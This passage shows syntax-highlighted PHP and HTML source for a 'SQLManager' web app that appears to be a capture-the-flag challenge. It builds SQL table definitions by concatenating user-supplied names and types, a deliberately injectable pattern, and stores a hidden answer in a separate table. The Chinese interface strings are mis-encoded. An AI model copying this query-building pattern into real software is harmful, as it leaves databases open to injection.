    <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'è¡¨ä¸åˆæ³•'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token number">10</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'åˆ—ä¸åˆæ³•'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"CREATE TABLE {$tName} ("</span><span class="token punctuation">;</span>
  <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"example1 TEXT, example2 TEXT"</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$column</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'åˆ—ä¸åˆæ³•'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'åˆ—ä¸åˆæ³•'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">', '</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"`$column` $type"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">');'</span><span class="token punctuation">;</span>

  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'CREATE TABLE `'</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">'` (`'</span> <span class="token punctuation">.</span> columnName <span class="token punctuation">.</span> <span class="token string">'` TEXT);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'INSERT INTO `'</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">'` VALUES ("'</span> <span class="token punctuation">.</span> ans <span class="token punctuation">.</span> <span class="token string">'");'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
  <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'remove'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$_SESSION</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'index'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM `{$tName}`;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span> <span class="token operator">===</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FETCH_NUM</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
<span class="token markup"><span class="token doctype">&lt;!doctype html></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>style.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://code.jquery.com/jquery-3.4.1.min.js<span class="token punctuation">"</span></span> <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo<span class="token punctuation">=</span><span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>SQLManager<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>show.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>SQLManager<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>ä¿¡æ¯ <span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token variable">$message</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'index'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token variable">$tName</span><span class="token punctuation">)</span> <span class="token delimiter">?></span> <span class="token punctuation">(</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?page<span class="token punctuation">=</span>remove<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>åˆ è¡¨<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?page<span class="token punctuation">=</span>modify<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token markup">&lt; count($cName); $i++) { ?></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token variable">$cName</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token markup">&lt; count($result); $i++) { ?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token markup">&lt; count($result[$i]); $j++) { ?></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token markup">&lt; count($cName); $i++) { ?></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>values[]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Insert values<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>å»ºè¡¨<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?page<span class="token punctuation">=</span>build<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">></span></span></span>è¡¨å <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>table_name<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>table_name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>è¾“å…¥è¡¨å<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">></span></span></span>åˆ—æ•° <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>num<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>next<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Next<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>table<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>Name<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>Type<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>example1<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token constant">TEXT</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>example2<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token constant">TEXT</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Create table<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>
    $<span class="token punctuation">(</span><span class="token string">'#next'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
      let num <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token string">'#num'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      let len <span class="token operator">=</span> $<span class="token punctuation">(</span><span class="token string">'#table_name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">&lt;=</span> len <span class="token operator">&amp;&amp;</span> len <span class="token operator">&lt;=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token number">0</span> <span class="token operator">&lt;</span> num <span class="token operator">&amp;&amp;</span> num <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        $<span class="token punctuation">(</span><span class="token string">'#info'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">'hidden'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        $<span class="token punctuation">(</span><span class="token string">'#table'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">removeClass</span><span class="token punctuation">(</span><span class="token string">'hidden'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span>let i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          $<span class="token punctuation">(</span><span class="token string">'#table table'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span>`
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>columns[${i}][name]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>
              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>columns[${i}][type]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
